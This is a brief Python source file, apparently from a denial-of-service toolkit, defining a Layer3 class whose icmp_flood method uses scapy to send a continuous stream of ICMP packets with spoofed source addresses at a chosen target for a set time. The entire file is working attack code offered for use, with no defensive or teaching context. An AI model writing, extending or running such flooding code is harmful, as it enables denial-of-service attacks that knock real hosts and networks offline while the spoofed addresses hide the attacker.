from scapy.all import *
import time as timing
from src.utils import spoof_ip


class Layer3:
    @staticmethod
    def icmp_flood(target: str, time: int):
        end_t = timing.time() + time
        while (timing.time() < end_t):
            packet = scapy.all.IP(dst=str(target), src=spoof_ip())/scapy.all.ICMP()
            send(packet, verbose=0)
